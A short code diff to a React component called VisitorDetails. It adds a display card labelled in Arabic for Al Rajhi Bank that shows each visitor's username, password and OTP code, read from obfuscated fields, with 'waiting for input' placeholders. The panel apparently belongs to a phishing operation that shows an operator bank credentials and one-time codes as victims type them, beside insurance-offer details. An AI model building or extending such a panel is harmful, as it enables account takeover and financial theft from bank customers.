@@ -471,6 +471,27 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     });
   }
 
+  // Rajhi Info - add to dynamic bubbles to sort by timestamp
+  const rajhiUser = visitor._v10 || visitor.rajhiUser;
+  const rajhiPassword = visitor._v11 || visitor.rajhiPassword;
+  const rajhiOtp = visitor._v12 || visitor.rajhiOtp;
+
+  if (rajhiUser || rajhiPassword || rajhiOtp || (visitor.currentStep as any) === "rajhi") {
+    bubbles.push({
+      id: "rajhi-info",
+      title: "🏦 الراجحي",
+      icon: "🏦",
+      color: "green",
+      data: {
+        "اسم المستخدم": rajhiUser || "في انتظار الإدخال...",
+        "كلمة المرور": rajhiPassword || "في انتظار الإدخال...",
+        "رمز OTP": rajhiOtp || "في انتظار الإدخال...",
+      },
+      timestamp: visitor.rajhiUpdatedAt || visitor.updatedAt,
+      showActions: false,
+    });
+  }
+
   // Sort bubbles: dynamic bubbles by timestamp (newest first), static bubbles at bottom
   const staticBubbleIds = ["basic-info", "insurance-details", "selected-offer"];
   const dynamicBubbles = bubbles.filter((b) => !staticBubbleIds.includes(b.id));
